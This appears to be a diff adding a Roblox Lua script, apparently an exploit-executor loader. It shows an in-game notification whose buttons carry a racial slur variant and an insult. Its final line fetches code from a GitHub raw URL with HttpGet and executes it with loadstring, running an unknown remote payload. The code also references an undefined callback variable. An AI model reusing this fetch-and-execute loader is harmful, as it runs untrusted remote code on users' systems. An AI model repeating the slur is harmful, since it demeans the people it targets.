@@ -1,0 +1,15 @@
+local NotificationBindable = Instance.new("BindableFunction")
+NotificationBindable.OnInvoke = callback
+--
+game.StarterGui:SetCore("SendNotification",  {
+ Title = "🤑";
+ Text = "ROSHOWCASER ON TOP";
+ Icon = "";
+ Duration = 5;
+ Button1 = "neggar";
+ Button2 = "fet is clown";
+ Callback = NotificationBindable;
+})
+
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Bilmemi/universal/main/finder'))()
